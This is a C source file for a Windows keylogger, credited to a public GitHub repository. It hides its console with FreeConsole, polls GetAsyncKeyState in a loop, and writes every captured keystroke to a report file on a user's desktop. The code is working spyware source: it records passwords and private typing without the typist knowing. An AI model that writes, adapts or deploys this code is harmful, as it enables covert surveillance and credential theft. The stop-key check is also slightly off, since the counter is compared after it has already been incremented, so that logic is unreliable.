
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

// Reference: https://raw.githubusercontent.com/hawkapparel/Keylogger-C/master/Keylogger.c
// Works, but need to update the ASCII codes as it was mapped to the Spanish keyboard previously

int Log_Keys() {
	short chr = 0;
	FILE* data;
	time_t t;
	struct tm* tm;
	char fechayhora[100];
	char* meses[12] = { "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" };
	t = time(NULL);
	tm = localtime(&t);
	int i = 1;
	// Delete old file
	remove("C:\\users\\flikk\\desktop\\report.txt");

	// Ocultamos la consola
	FreeConsole();
	// Open log file
	data = fopen("C:\\users\\flikk\\desktop\\report.txt", "a+");

	// Save report header
	fprintf(data, "Keys logged on %02d of %s of %d\n", tm->tm_mday, meses[tm->tm_mon], 1900 + tm->tm_year);

	// Start logging keys...
	while (1) {
		if (GetAsyncKeyState(chr++) == -32767) {
			switch (chr - 1) {
			case 1:	fprintf(data, "(CLICIZQ)");	break;
			case 2:	fprintf(data, "(CLICDER)");	break;
			case 8:	fprintf(data, "(BACKSPACE)");	break;
			case 9:	fprintf(data, "(TAB)");	break;
			case 13:	fprintf(data, "(ENTER)");	break;
			//case 16:	fprintf(data, "(SHIFT)");	break;
			//case 17:	fprintf(data, "(CONTROL)");	break;
			case 18:	fprintf(data, "(ALT)");	break;
			case 19:	fprintf(data, "(PAUSE)");	break;
			case 20:	fprintf(data, "(CAPSLOCK)");	break;
			case 27:	fprintf(data, "(ESCAPE)");	break;
			case 32:	fprintf(data, " ");	break;
			case 33:	fprintf(data, "(PAGEUP)");	break;
			case 34:	fprintf(data, "(PAGEDOWN)");	break;
			case 35:	fprintf(data, "(END)");	break;
			case 36:	fprintf(data, "(HOME)");	break;
			case 37:	fprintf(data, "(LEFT)");	break;
			case 38:	fprintf(data, "(UP)");	break;
			case 39:	fprintf(data, "(RIGHT)");	break;
			case 40:	fprintf(data, "(DOWN)");	break;
			case 44:	fprintf(data, "(PRINTSCREEN)");	break;
			case 45:	fprintf(data, "(INSERT)");	break;
			case 46:	fprintf(data, "(DELETE)");	break;
			case 112:	fprintf(data, "(F1)");	break;
			case 113:	fprintf(data, "(F2)");	break;
			case 114:	fprintf(data, "(F3)");	break;
			case 115:	fprintf(data, "(F4)");	break;
			case 116:	fprintf(data, "(F5)");	break;
			case 117:	fprintf(data, "(F6)");	break;
			case 118:	fprintf(data, "(F7)");	break;
			case 119:	fprintf(data, "(F8)");	break;
			case 120:	fprintf(data, "(F9)");	break;
			case 121:	fprintf(data, "(F10)");	break;
			case 122:	fprintf(data, "(F11)");	break;
			case 123:	fprintf(data, "(F12)");	break;
			case 124:	fprintf(data, "(F13)");	break;
			case 125:	fprintf(data, "(F14)");	break;
			case 126:	fprintf(data, "(F15)");	break;
			case 127:	fprintf(data, "(F16)");	break;
			case 144:	fprintf(data, "(NUMLOCK)");	break;
			case 145:	fprintf(data, "(SCROLLLOCK)");	break;
			case 160:	fprintf(data, "(LSHIFT)");	break;
			case 161:	fprintf(data, "(RSHIFT)");	break;
			case 162:	fprintf(data, "(LCONTROL)");	break;
			case 163:	fprintf(data, "(RCONTROL)");	break;
			case 164:	fprintf(data, "(LALT)");	break;
			case 165:	fprintf(data, "(RALT)");	break;
			case 220:	fprintf(data, "|");	break;
			case 219:	fprintf(data, "'");	break;
			case 221:	fprintf(data, "(OPEN INTERROGATION)");	break;
			case 191:	fprintf(data, "}");	break;
			case 186:	fprintf(data, "(ACCENT)");	break;
			case 187:	fprintf(data, "+");	break;
			case 192:	fprintf(data, "(ENIE)");	break;
			case 222:	fprintf(data, "{");	break;
			case 188:	fprintf(data, ",");	break;
			case 190:	fprintf(data, ".");	break;
			case 189:	fprintf(data, "-");	break;
			case 226:	fprintf(data, "<");	break;
			default:	
				if ((chr - 1) >= 65 && (chr - 1) <= 90) {
					fprintf(data, "%c", chr - 1 + 32);	break;
				}
				else {
					fprintf(data, "%c", chr - 1);	break;
				}
				
			}

			if (chr == 124) // If F12 is pressed, stop logger
				break;
		}
		if (chr >= 255)
			chr = 0;
	}

	fclose(data); // Close the file
}